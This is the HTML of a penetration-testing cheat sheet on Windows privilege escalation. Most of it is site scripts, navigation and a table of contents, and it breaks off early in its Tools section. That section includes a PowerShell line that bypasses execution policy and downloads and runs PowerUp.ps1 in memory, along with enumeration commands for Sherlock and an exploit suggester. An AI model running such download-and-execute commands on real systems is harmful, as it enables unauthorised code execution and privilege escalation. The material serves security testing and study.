<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Techniques and methodologies for escalting privileges on Windows and lateral movement (promoting to Administrator from user or to a user with more permissions)."><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content="Windows - Privilege Escalation"><meta property="og:description" content="Techniques and methodologies for escalting privileges on Windows and lateral movement (promoting to Administrator from user or to a user with more permissions)."><meta property="og:type" content="article"><meta property="og:url" content="https://www.grayhatfreelancing.com/docs/windows_privilege_escalation/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2022-11-04T00:00:00+00:00"><meta property="article:modified_time" content="2022-12-10T11:35:25-05:00"><title>Windows - Privilege Escalation | Gray Hat Freelancing</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css integrity="sha256-SzX+0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt+5t7EDugY=" crossorigin=anonymous><script defer src=/flexsearch.min.js></script>
<script defer src=/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2+lMiccGbo=" crossorigin=anonymous></script>
<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5VH24CV5RY",{anonymize_ip:!1})}</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[o]=e[o]||function(){(e[o].a=e[o].a||[]).push(arguments)},e[o].l=1*new Date;for(var r=0;r<document.scripts.length;r++)if(document.scripts[r].src===s)return;i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym"),ym(90832071,"init",{clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!0})</script><noscript><div><img src=https://mc.yandex.ru/watch/90832071 style=position:absolute;left:-9999px alt></div></noscript><script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce=v6fQG2hYHmw1rpUUC6mr9w></script><script nonce=v6fQG2hYHmw1rpUUC6mr9w>(function(){function e(){if(!window.frames.googlefcPresent)if(document.body){const e=document.createElement("iframe");e.style="width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;",e.style.display="none",e.name="googlefcPresent",document.body.appendChild(e)}else setTimeout(e,0)}e()})()</script>
<script>(function(){"use strict";if(V=function(e){var t=0;return function(){return t<e.length?{done:!1,value:e[t++]}:{done:!0}}},P="function"==typeof Object.create?Object.create:function(e){var t=function(){};return t.prototype=e,new t},"function"==typeof Object.setPrototypeOf)g=Object.setPrototypeOf;else{a:{N={a:!0},O={};try{O.__proto__=N,k=O.a;break a}catch{}k=!1}g=k?function(e,t){if(e.__proto__=t,e.__proto__!==t)throw new TypeError(e+" is not extensible");return e}:null}var F=g,w=function(e,t){if(e.prototype=P(t.prototype),e.prototype.constructor=e,F)F(e,t);else for(n in t)if("prototype"!=n)if(Object.defineProperties){var n,s=Object.getOwnPropertyDescriptor(t,n);s&&Object.defineProperty(e,n,s)}else e[n]=t[n];e.v=t.prototype},e=this||self,Z=function(){},M=function(e){return e},m=function(e,t){this.g=t===S?e:""};m.prototype.toString=function(){return this.g+""},S={},E=function(t){if(void 0===h){var n=null,s=e.trustedTypes;if(s&&s.createPolicy){try{n=s.createPolicy("goog#html",{createHTML:M,createScript:M,createScriptURL:M})}catch(t){e.console&&e.console.error(t.message)}h=n}else h=n}return t=(n=h)?n.createScriptURL(t):t,new m(t,S)},x=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)},C={},r=null,b="function"==typeof Uint8Array;function T(e,t,n){return"object"==typeof e?b&&!Array.isArray(e)&&e instanceof Uint8Array?n(e):D(e,t,n):t(e)}function D(e,t,n){if(Array.isArray(e)){for(var a,o=Array(e.length),s=0;s<e.length;s++)a=e[s],a!=null&&(o[s]=T(a,t,n));return Array.isArray(e)&&e.s&&i(o),o}o={};for(s in e)Object.prototype.hasOwnProperty.call(e,s)&&(a=e[s],a!=null&&(o[s]=T(a,t,n)));return o}function ee(e){return D(e,function(e){return"number"==typeof e?isFinite(e)?e:String(e):e},function(e){if(void 0===n&&(n=0),!r){r={};for(var t,n,s,o,l,d,a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),c=["+/=","+/","-_=","-_.","-_"],i=0;5>i;i++){t=a.concat(c[i].split("")),C[i]=t;for(s=0;s<t.length;s++)o=t[s],void 0===r[o]&&(r[o]=s)}}n=C[n],a=Array(Math.floor(e.length/3)),c=n[64]||"";for(i=t=0;t<e.length-2;t+=3)l=e[t],d=e[t+1],o=e[t+2],s=n[l>>2],l=n[(l&3)<<4|d>>4],d=n[(d&15)<<2|o>>6],o=n[o&63],a[i++]=""+s+l+d+o;switch(s=0,o=c,e.length-t){case 2:s=e[t+1],o=n[(s&15)<<2]||c;case 1:e=e[t],a[i]=""+n[e>>2]+n[(e&3)<<4|s>>4]+o+c}return a.join("")})}var $={s:{value:!0,configurable:!0}},i=function(e){return Array.isArray(e)&&!Object.isFrozen(e)&&Object.defineProperties(e,$),e},o=function(e,t,n){var s=p;p=null,e||(e=s),s=this.constructor.u,e||(e=s?[s]:[]),this.j=s?0:-1,this.h=null,this.g=e;a:{if(s=this.g.length,e=s-1,s&&(s=this.g[e],!(null===s||"object"!=typeof s||Array.isArray(s)||b&&s instanceof Uint8Array))){this.l=e-this.j,this.i=s;break a}void 0!==t&&-1<t?(this.l=Math.max(t,e+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(n)for(t=0;t<n.length;t++)e=n[t],e<this.l?(e+=this.j,(s=this.g[e])?i(s):this.g[e]=f):(s=this.l+this.j,this.g[s]||(this.i=this.g[s]={}),(s=this.i[e])?i(s):this.i[e]=f)},f=Object.freeze(i([])),t=function(e,t){if(-1===t)return null;if(t<e.l){t+=e.j;var n=e.g[t];return n!==f?n:e.g[t]=i([])}if(e.i)return n=e.i[t],n!==f?n:e.i[t]=i([])},z=function(e,n){var s,o=L;return-1===n?null:(e.h||(e.h={}),e.h[n]||(s=t(e,n),s&&(e.h[n]=new o(s))),e.h[n])};o.prototype.toJSON=function(){var e=l(this,!1);return ee(e)},l=function(e,t){if(e.h)for(o in e.h)if(Object.prototype.hasOwnProperty.call(e.h,o)){var s,o,n=e.h[o];if(Array.isArray(n))for(s=0;s<n.length;s++)n[s]&&l(n[s],t);else n&&l(n,t)}return e.g},j=function(e,t){return p=t=t?JSON.parse(t):null,e=new e(t),p=null,e},o.prototype.toString=function(){return l(this,!1).toString()},A=function(e){o.call(this,e)},w(A,o);function Q(e){var t,s=(e.ownerDocument&&e.ownerDocument.defaultView||window).document,n=null===(t=s.querySelector)||void 0===t?void 0:t.call(s,"script[nonce]");(t=n?n.nonce||n.getAttribute("nonce")||"":"")&&e.setAttribute("nonce",t)}u=function(e,t){return t=String(t),"application/xhtml+xml"===e.contentType&&(t=t.toLowerCase()),e.createElement(t)},d=function(t){this.g=t||e.document||document},d.prototype.appendChild=function(e,t){e.appendChild(t)};var r,l,d,u,h,p,g,b,j,y,_,O,x,C,E,k,A,S,N,P,V,v=function(e,t,n,s,o,i){try{var r=e.g,a=u(e.g,"SCRIPT");a.async=!0,a.src=t instanceof m&&t.constructor===m?t.g:"type_error:TrustedResourceUrl",Q(a),r.head.appendChild(a),a.addEventListener("load",function(){o(),s&&r.head.removeChild(a)}),a.addEventListener("error",function(){0<n?v(e,t,n-1,s,o,i):(s&&r.head.removeChild(a),i())})}catch{i()}},X=e.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),K=e.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),U=e.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),W=function(e,t,n){this.h=e,this.j=new d(this.h),this.g=null,this.i=[],this.l=!1,this.o=t,this.m=n},I=function(t){if(t.h.body&&!t.l){var n=function(){B(t),e.setTimeout(function(){return R(t,3)},50)};v(t.j,t.o,2,!0,function(){e[t.m]||n()},n),t.l=!0}},B=function(e){for(var i,r,c,l,t=n(1,5),o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i);t=s(e),t.style.bottom="0",t.style.left="0",t.style.position="fixed",t.style.width=n(100,110).toString()+"%",t.style.zIndex=n(2147483544,2147483644).toString(),t.style["background-color"]=H(249,259,242,252,219,229),t.style["box-shadow"]="0 0 12px #888",t.style.color=H(0,10,0,10,0,10),t.style.display="flex",t.style["justify-content"]="center",t.style["font-family"]="Roboto, Arial",o=s(e),o.style.width=n(80,85).toString()+"%",o.style.maxWidth=n(750,775).toString()+"px",o.style.margin="24px",o.style.display="flex",o.style["align-items"]="flex-start",o.style["justify-content"]="center",i=u(e.j.g,"IMG"),i.className=x(),i.src=X,i.style.height="24px",i.style.width="24px",i.style["padding-right"]="16px",r=s(e),c=s(e),c.style["font-weight"]="bold",c.textContent=K,l=s(e),l.textContent=U,a(e,r,c),a(e,r,l),a(e,o,i),a(e,o,r),a(e,t,o),e.g=t,e.h.body.appendChild(e.g),t=n(1,5);for(o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i)},a=function(e,t,o){for(var r,i=n(1,5),a=0;a<i;a++)r=s(e),t.appendChild(r);t.appendChild(o),o=n(1,5);for(i=0;i<o;i++)a=s(e),t.appendChild(a)},n=function(e,t){return Math.floor(e+Math.random()*(t-e))},H=function(e,t,s,o,i,a){return"rgb("+n(Math.max(e,0),Math.min(t,255)).toString()+","+n(Math.max(s,0),Math.min(o,255)).toString()+","+n(Math.max(i,0),Math.min(a,255)).toString()+")"},s=function(e){return e=u(e.j.g,"DIV"),e.className=x(),e},R=function(t,n){0>=n||null!=t.g&&0!=t.g.offsetHeight&&0!=t.g.offsetWidth||(q(t),B(t),e.setTimeout(function(){return R(t,n-1)},50))},q=function(e){var t=e.i,n="undefined"!=typeof Symbol&&Symbol.iterator&&t[Symbol.iterator],t=n?n.call(t):{next:V(t)};for(n=t.next();!n.done;n=t.next())(n=n.value)&&n.parentNode&&n.parentNode.removeChild(n);e.i=[],(t=e.g)&&t.parentNode&&t.parentNode.removeChild(t),e.g=null},Y=function(t,n,s,o,i){var a=G(s),c=function(s){s.appendChild(a),e.setTimeout(function(){a?(0!==a.offsetHeight&&0!==a.offsetWidth?n():t(),a.parentNode&&a.parentNode.removeChild(a)):t()},o)},r=function(t){document.body?c(document.body):0<t?e.setTimeout(function(){r(t-1)},i):n()};r(3)},G=function(e){var t=document.createElement("div");return t.className=e,t.style.width="1px",t.style.height="1px",t.style.position="absolute",t.style.left="-10000px",t.style.top="-10000px",t.style.zIndex="-10000",t},L=function(e){o.call(this,e)};w(L,o),_=function(e){o.call(this,e)},w(_,o),y=function(e,n){this.l=e,this.m=new d(e.document),this.g=n,this.i=t(this.g,1),n=z(this.g,2),this.o=E(t(n,4)||""),this.h=!1,n=z(this.g,13),n=E(t(n,4)||""),this.j=new W(e.document,n,t(this.g,12))},y.prototype.start=function(){J(this)};var J=function(n){te(n),v(n.m,n.o,3,!1,function(){a:{var i,s=n.i,o=e.btoa(s);if(o=e[o]){try{i=j(A,e.atob(o))}catch{s=!1;break a}s=s===t(i,1)}else s=!1}s?c(n,t(n.g,14)):(c(n,t(n.g,8)),I(n.j))},function(){Y(function(){c(n,t(n.g,7)),I(n.j)},function(){return c(n,t(n.g,6))},t(n.g,9),t(n.g,10),t(n.g,11))})},c=function(e,t){e.h||(e.h=!0,e=new e.l.XMLHttpRequest,e.open("GET",t,!0),e.send())},te=function(n){var s=e.btoa(n.i);n.l[s]&&c(n,t(n.g,5))};(function(t,n){e[t]=function(){for(var i=[],o=0;o<arguments.length;++o)i[o-0]=arguments[o];e[t]=Z,n.apply(null,i)}})("__h82AlnkH6D91__",function(e){"function"==typeof window.atob&&new y(window,j(_,window.atob(e))).start()})}).call(this),window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hVTV9oOG1BMHF6c2xHRlBZR0xrS2g0UHRVX21ERkZSWVBjcTFBZU1aN0diVW5xSGRzNlR5OUZTYWlsM0thZ28tb19BU3hqbjRyZFdLOGhzVUlHbmFqalZRXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZScnBMVGFzQ1JjSDBxSkpfSVhRWmd1YXQxZ292Ty01YlN0WUJXNGJUTThTNjlTdUU0WkVQVnZKZ0E2WC1UY1VNTlRLbXc3V1hLU2NoY1pJaHFOTVJ2UmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFUxMG44RWlxNnBhUEw5Q1lOcjBZcG1xdTVuZzVzTkR3Zm5yN1pSRVExWEt5UlBLMFJxS1RST2Y0Q3B5S0pIUFpVem83MldIU3VrbWlKb1p4c2Y2RzJwLWdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZDb2RlRVZCbFQxdXA5MUMzZ0V0dVFROVVxbVBSVGwwS2Qyc1FqcF9GWHV3WGxFYUhVekNvSWIxUzJtQnZ4T3Q5eHJra19vNWRXbWFfYl83dl9JRlVpeHdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VjRnWnE1WHlLaXVNS3lHdUU1Y2ZISDdoNWUtb0VVZktOekNTWEgzYmN2U285OTNYLTFuc0VkU19SZjRjUTNYZjZJSEdyaGFIb1FNc1hqMFhZUGcwMFU5d1x1MDAzZFx1MDAzZCJd")</script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Gray Hat Freelancing</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=/docs/insecure_deserialization/dotnet/>.NET Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/>Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/node/>Node Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/php/>PHP Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/java/>Insecure Deserialization - Java</a></li><li><a href=/docs/exercism_solutions/>Exercism Solutions</a></li><li><a href=/docs/amazon_aws_s3_buckets/>Amazon AWS S3 Buckets</a></li><li><a href=/docs/csrf_injection/>CSRF Injection</a></li><li><a href=/docs/cobalt_strike_all_you_need/>Cobalt Strike</a></li><li><a href=/docs/brute_force_cracking/>Brute Force Cracking</a></li><li><a href=/docs/training_grounds/>Training Grounds</a></li><li><a href=/docs/attacking_active_directory/>Active Directory Attacks</a></li><li><a href=/docs/wordpress/>Wordpress Security</a></li><li><a href=/docs/windows_hardening/>Windows - Hardening</a></li><li><a href=/docs/windows_amsi_bypass/>Bypassing AMSI protections</a></li><li><a href=/docs/subdomains_enumeration/>Enumerating Subdomains</a></li><li><a href=/docs/windows_mimikatz/>Windows - Mimikatz</a></li><li><a href=/docs/windows_persistence/>Windows - Persistence</a></li><li><a href=/docs/windows_privilege_escalation/ class=active>Windows - Privilege Escalation</a></li><li><a href=/docs/windows_using_credentials/>Windows - Using Credentials</a></li><li><a href=/docs/windows_download_and_execute/>Windows Download and Execute Methods</a></li><li><a href=/docs/escape_breakout/>Application Escape and Breakout</a></li><li><a href=/docs/office_attacks/>Attacking Office</a></li><li><a href=/docs/bind_shell_cheatsheet/>Bind Shell Cheatsheet</a></li><li><a href=/docs/methodology_and_enumeration/>Bug Hunting Methodology and Enumeration</a></li><li><a href=/docs/hash_cracking/>Hash Cracking Cheatsheet</a></li><li><a href=/docs/linux_persistence/>Linux - Persistence</a></li><li><a href=/docs/linux_privilege_escalation/>Linux - Privilege Escalation</a></li><li><a href=/docs/metasploit_cheatsheet/>Metasploit</a></li><li><a href=/docs/windows_dpapi/>Microsoft Window's Data Protection API</a></li><li><a href=/docs/microsoft_azure_cloud/>Microsoft's Azure Cloud</a></li><li><a href=/docs/network_discovery/>Network Discovery</a></li><li><a href=/docs/network_pivoting_techniques/>Network Pivoting Cheatsheet</a></li><li><a href=/docs/mssql_server_cheatsheet/>Pentesting MSSQL Server Cheatsheet</a></li><li><a href=/docs/powershell_cheatsheet/>Powershell Cheatsheet</a></li><li><a href=/docs/reverse_shell_cheatsheet/>Reverse Shell Cheatsheet</a></li><li><a href=/docs/source_code_management/>Source Code Management</a></li><li><a href=/docs/docker_pentesting/>Docker Security</a></li><li><a href=/docs/miscellaneous_tricks/>Miscellaneous Tips and Tricks</a></li><li><a href=/docs/graphql_injection/>GraphQL Injection</a></li><li><a href=/docs/csv_injection/>Csv Injection</a></li><li><a href=/docs/checking_for_account_takeover/>Account Takeovers</a></li><li><a href=/docs/api_key_leaks/>API Key Leaks</a></li><li><a href=/docs/command_injection/>Command Injection</a></li><li><a href=/docs/cors_misconfigurations/>CORS Misconfigurations</a></li><li><a href=/docs/crlf_injection/>CRLF Injection</a></li><li><a href=/docs/cve_exploits/>CVE Exploits</a></li><li><a href=/docs/dependency_confusion_attacks/>Dependency Confusion</a></li><li><a href=/docs/directory_traversal/>Directory Traversal</a></li><li><a href=/docs/dns_rebinding/>DNS Rebinding</a></li><li><a href=/docs/file_inclusion/>File Inclusion</a></li><li><a href=/docs/http_parameter_pollution/>HTTP Parameter Pollution</a></li><li><a href=/docs/insecure_direct_object_references/>Insecure Direct Object References</a></li><li><a href=/docs/insecure_file_uploads/>Insecure File Upload</a></li><li><a href=/docs/insecure_management_interfaces/>Insecure Management Interface</a></li><li><a href=/docs/insecure_source_code_management/>Insecure Source Code Management</a></li><li><a href=/docs/java_rmi/>Java RMI</a></li><li><a href=/docs/json_web_token/>JSON Web Tokens</a></li><li><a href=/docs/kuburnetes/>Kuburnetes</a></li><li><a href=/docs/latex_injection/>LaTeX Injection</a></li><li><a href=/docs/ldap_injection/>LDAP Injection</a></li><li><a href=/docs/nosql_injection/>NoSQL Injection</a></li><li><a href=/docs/oauth/>OAuth</a></li><li><a href=/docs/open_url_redirection/>Open URL Redirection</a></li><li><a href=/docs/race_conditions/>Race Conditions</a></li><li><a href=/docs/request_smuggling/>Request Smuggling</a></li><li><a href=/docs/saml_injection/>SAML Injection</a></li><li><a href=/docs/server_side_request_forgery/>Server-Side Request Forgery</a></li><li><a href=/docs/server_side_template_injection/>Server-Side Template Injection</a></li><li><a href=/docs/sql_injection/>SQL Injection</a></li><li><a href=/docs/tabnabbing/>Tabnabbing</a></li><li><a href=/docs/type_juggling/>Type Juggling</a></li><li><a href=/docs/web_cache_deception/>Web Cache Deception</a></li><li><a href=/docs/web_sockets/>Web Sockets Attacks</a></li><li><a href=/docs/xxe_injection/>XML eXternal Entity Injection</a></li><li><a href=/docs/xpath_injection/>XPATH Injection</a></li><li><a href=/docs/xslt_injection/>XSLT Injection</a></li><li><a href=/docs/xss_injection/>XSS Injection</a></li></ul><ul><li><a href=/posts/>Blog</a></li><li><a href=https://github.com/m00tiny/ target=_blank rel=noopener>Github</a></li><li><a href=https://github.com/m00tiny/grayhatfreelancing target=_blank rel=noopener>Contribute</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
<strong>Windows - Privilege Escalation</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#windows---privilege-escalation>Windows - Privilege Escalation</a><ul><li><a href=#tools>Tools</a></li><li><a href=#windows-version-and-configuration>Windows Version and Configuration</a></li><li><a href=#user-enumeration>User Enumeration</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#antivirus--detections>Antivirus & Detections</a><ul><li><a href=#windows-defender>Windows Defender</a></li><li><a href=#firewall>Firewall</a></li><li><a href=#applocker-enumeration>AppLocker Enumeration</a></li><li><a href=#powershell>Powershell</a></li><li><a href=#default-writeable-folders>Default Writeable Folders</a></li></ul></li><li><a href=#eop---looting-for-passwords>EoP - Looting for passwords</a><ul><li><a href=#sam-and-system-files>SAM and SYSTEM files</a></li><li><a href=#laps-settings>LAPS Settings</a></li><li><a href=#hivenightmare>HiveNightmare</a></li><li><a href=#search-for-file-contents>Search for file contents</a></li><li><a href=#search-for-a-file-with-a-certain-filename>Search for a file with a certain filename</a></li><li><a href=#search-the-registry-for-key-names-and-passwords>Search the registry for key names and passwords</a></li><li><a href=#read-a-value-of-a-certain-sub-key>Read a value of a certain sub key</a></li><li><a href=#passwords-in-unattendxml>Passwords in unattend.xml</a></li><li><a href=#iis-web-config>IIS Web config</a></li><li><a href=#other-files>Other files</a></li><li><a href=#wifi-passwords>Wifi passwords</a></li><li><a href=#sticky-notes-passwords>Sticky Notes passwords</a></li><li><a href=#passwords-stored-in-services>Passwords stored in services</a></li><li><a href=#passwords-stored-in-key-manager>Passwords stored in Key Manager</a></li><li><a href=#powershell-history>Powershell History</a></li><li><a href=#powershell-transcript>Powershell Transcript</a></li><li><a href=#password-in-alternate-data-stream>Password in Alternate Data Stream</a></li></ul></li><li><a href=#eop---processes-enumeration-and-tasks>EoP - Processes Enumeration and Tasks</a></li><li><a href=#eop---incorrect-permissions-in-services>EoP - Incorrect permissions in services</a><ul><li><a href=#example-with-windows-10---cve-2019-1322-usosvc>Example with Windows 10 - CVE-2019-1322 UsoSvc</a></li><li><a href=#example-with-windows-xp-sp1---upnphost>Example with Windows XP SP1 - upnphost</a></li></ul></li><li><a href=#eop---windows-subsystem-for-linux-wsl>EoP - Windows Subsystem for Linux (WSL)</a></li><li><a href=#eop---unquoted-service-paths>EoP - Unquoted Service Paths</a><ul><li><a href=#example>Example</a></li></ul></li><li><a href=#eop---path-interception>EoP - $PATH Interception</a></li><li><a href=#eop---named-pipes>EoP - Named Pipes</a></li><li><a href=#eop---kernel-exploitation>EoP - Kernel Exploitation</a><ul><li></li></ul></li><li><a href=#eop---alwaysinstallelevated>EoP - AlwaysInstallElevated</a></li><li><a href=#eop---insecure-gui-apps>EoP - Insecure GUI apps</a></li><li><a href=#eop---evaluating-vulnerable-drivers>EoP - Evaluating Vulnerable Drivers</a></li><li><a href=#eop---printers>EoP - Printers</a><ul><li><a href=#universal-printer>Universal Printer</a></li><li><a href=#printernightmare>PrinterNightmare</a></li><li><a href=#bring-your-own-vulnerability>Bring Your Own Vulnerability</a></li></ul></li><li><a href=#eop---runas>EoP - Runas</a></li><li><a href=#eop---abusing-shadow-copies>EoP - Abusing Shadow Copies</a></li><li><a href=#eop---from-local-administrator-to-nt-system>EoP - From local administrator to NT SYSTEM</a></li><li><a href=#eop---living-off-the-land-binaries-and-scripts>EoP - Living Off The Land Binaries and Scripts</a></li><li><a href=#eop---impersonation-privileges>EoP - Impersonation Privileges</a><ul><li><a href=#restore-a-service-accounts-privileges>Restore A Service Account&rsquo;s Privileges</a></li><li><a href=#meterpreter-getsystem-and-alternatives>Meterpreter getsystem and alternatives</a></li><li><a href=#rottenpotato-token-impersonation>RottenPotato (Token Impersonation)</a></li><li><a href=#juicy-potato-abusing-the-golden-privileges>Juicy Potato (Abusing the golden privileges)</a></li><li><a href=#rogue-potato-fake-oxid-resolver>Rogue Potato (Fake OXID Resolver)</a></li><li><a href=#efspotato-ms-efsr-efsrpcopenfileraw>EFSPotato (MS-EFSR EfsRpcOpenFileRaw)</a></li><li><a href=#juicypotatong>JuicyPotatoNG</a></li></ul></li><li><a href=#eop---privileged-file-write>EoP - Privileged File Write</a><ul><li><a href=#diaghub>DiagHub</a></li><li><a href=#usodllloader>UsoDLLLoader</a></li><li><a href=#wertrigger>WerTrigger</a></li></ul></li><li><a href=#eop---common-vulnerabilities-and-exposure>EoP - Common Vulnerabilities and Exposure</a><ul><li><a href=#ms08-067-netapi>MS08-067 (NetAPI)</a></li><li><a href=#ms10-015-kitrap0d---microsoft-windows-nt200020032008xpvista7>MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7</a></li><li><a href=#ms11-080-afdsys---microsoft-windows-xp2003>MS11-080 (afd.sys) - Microsoft Windows XP/2003</a></li><li><a href=#ms15-051-client-copy-image---microsoft-windows-20032008782012>MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012</a></li><li><a href=#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64>MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64)</a></li><li><a href=#ms17-010-eternal-blue>MS17-010 (Eternal Blue)</a></li><li><a href=#cve-2019-1388>CVE-2019-1388</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=windows---privilege-escalation>Windows - Privilege Escalation
<a class=anchor href=#windows---privilege-escalation>#</a></h1><h2 id=tools>Tools
<a class=anchor href=#tools>#</a></h2><ul><li><a href=https://github.com/PowerShellMafia/PowerSploit>PowerSploit&rsquo;s PowerUp</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>powershell -Version <span style=color:#ae81ff>2</span> -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(<span style=color:#e6db74>&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;</span>); Invoke-AllChecks
</span></span></code></pre></div></li><li><a href=https://github.com/rasta-mouse/Watson>Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock</a></li><li><a href=https://github.com/rasta-mouse/Sherlock>(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile <span style=color:#f92672>-File</span> Sherlock.ps1
</span></span></code></pre></div></li><li><a href=https://github.com/AlessandroZ/BeRoot>BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></li><li><a href=https://github.com/GDSSecurity/Windows-Exploit-Suggester>Windows-Exploit-Suggester</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>./windows-exploit-suggester.py --update
</span></span><span style=display:flex><span>./windows-exploit-suggester.py --database <span style=color:#ae81ff>2014</span>-<span style=color:#ae81ff>06</span>-<span style=color:#ae81ff>06</span>-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
